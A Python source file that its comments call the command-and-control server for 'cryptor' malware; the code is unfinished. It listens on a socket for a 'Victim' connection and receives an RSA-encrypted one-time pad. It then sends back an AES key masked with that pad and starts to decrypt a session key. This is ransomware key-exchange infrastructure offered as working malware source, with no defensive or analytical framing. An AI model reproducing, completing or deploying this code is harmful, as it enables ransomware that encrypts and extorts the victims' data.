# This will eventually be the command and control center for the cryptor malware
# the C2.py file being imported is automattically generated by the make file,
# this makes it easy to define variables at the start that do not need to be changed
# after everything is set up.

from C2 import *;
import sys
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5
import socket
import base64

def applyOTP(OTP, KEY):
    return bytes(o ^ k for o, k in zip(OTP, KEY))

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
    sock.bind(('127.0.0.1',PORT_SVR))
    sock.listen(1)
    conn, addr = sock.accept()
    with conn:
        print("C2 Server >> Victim",addr,'connected')
        OTPPacketLen = int.from_bytes(conn.recv(8),byteorder='big',signed=False)
        if(conn.send(b"\x01") != 1):
            print("An error has occured in this connection before the EncryptedOTP could be recieved");
            sys.exit(-1)
        EncryptedOTP = conn.recv(OTPPacketLen)
        rsaKey = RSA.import_key(PRVKEY)
        cipher = PKCS1_v1_5.new(rsaKey)
        OTP = cipher.decrypt(EncryptedOTP,"failed")
        aesKey = base64.b64decode(AESKEY, altchars=None, validate=False)      
        OTPencodedAESKey = applyOTP(OTP,aesKey)
        conn.send(OTPencodedAESKey);
        # initiate the session key
        SessionKeyPacketLen = int.from_bytes(conn.recv(8),byteorder='big',signed=False)
        print(str(hex( SessionKeyPacketLen )));
        if(conn.send(b"\x01") != 1):
            print("An error has occured in this connection before the EncryptedOTP could be recieved");
            sys.exit(-1)
        EncryptedKey = conn.recv(SessionKeyPacketLen)
        SessionKey = cipher.decrypt(EncryptedKey,"failed")
      


